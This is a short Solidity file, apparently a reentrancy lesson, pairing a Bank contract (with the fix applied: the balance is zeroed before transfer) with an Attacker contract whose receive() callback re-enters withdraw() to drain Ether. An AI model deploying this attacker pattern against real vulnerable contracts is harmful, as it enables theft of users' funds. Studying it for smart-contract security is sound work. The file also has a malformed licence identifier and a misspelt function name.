//SPDX-License-Identifier: GPL-30
pragma solidity >= 0.8.1;

contract Bank{
    mapping(address=> uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint currentBalance = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool result,) = msg.sender.call{value:currentBalance}("");
        require(result,"ERROR");
        // balances[msg.sender] = 0;
    }

    function checkBalance() external view returns(uint) {
        return address(this).balance;
    }
}

contract Attacker {

  
    Bank public bank;
    address public owner;
    receive() payable external {
        if(address(msg.sender).balance>0) {
            bank.withdraw();
        }
    }

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    function sendEther() external payable {
        bank.deposit{value:msg.value}();
    }

    function withdrawEther() external {
        bank.withdraw();
    }

    function chekcBalance() external view returns(uint) {
        return address(this).balance;
    }

}